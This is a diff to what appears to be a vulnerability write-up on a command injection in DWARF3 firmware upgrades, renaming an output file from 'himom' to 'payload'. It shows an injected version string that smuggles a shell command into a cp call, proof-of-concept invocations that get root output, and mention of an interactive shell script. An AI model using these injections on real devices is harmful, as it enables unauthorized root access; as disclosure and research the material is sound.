@@ -101,13 +101,13 @@ parse at `0x9b5040` uses a stringstream and stops at the first non-digit. So a
 value like:
 
 ```
-1.5.4.19; id > /DWARF3/himom; #
+1.5.4.19; id > /DWARF3/payload; #
 ```
 
 passes the version check as `1.5.4.19`, and the rest ends up in the command:
 
 ```sh
-cp <src> /usrdata/firmware/dwarf3_upgrade_firmware_v1.5.4.19; id > /DWARF3/himom; #.zip
+cp <src> /usrdata/firmware/dwarf3_upgrade_firmware_v1.5.4.19; id > /DWARF3/payload; #.zip
 ```
 
 `cp` runs, then the injected command runs, then `#` comments out the rest.
@@ -116,11 +116,11 @@ Reproduction:
 
 ```console
 $ python3 dwarf3_targetpath_poc.py <ip> --target /DWARF3 \
-      --inject-field new --inject 'id > /DWARF3/himom'
+      --inject-field new --inject 'id > /DWARF3/payload'
 [*] POST http://<ip>:8082/uploadFirmwareDiff
 [*] HTTP 200: { "code": -15 }
 
-$ curl -s http://<ip>/DWARF3/himom
+$ curl -s http://<ip>/DWARF3/payload
 uid=0(root) gid=0(root)
 ```
 
@@ -285,8 +285,8 @@ CP'ing to /DWARF3 and downloading it will do.
 python3 dwarf3_targetpath_poc.py <ip> --target /DWARF3
 
 # command injection
-python3 dwarf3_targetpath_poc.py <ip> --inject-field new --inject 'id > /DWARF3/himom'
-curl -s http://<ip>/DWARF3/himom
+python3 dwarf3_targetpath_poc.py <ip> --inject-field new --inject 'id > /DWARF3/payload'
+curl -s http://<ip>/DWARF3/payload
 
 # interactive shell
 python3 dwarf3_shell.py <ip>
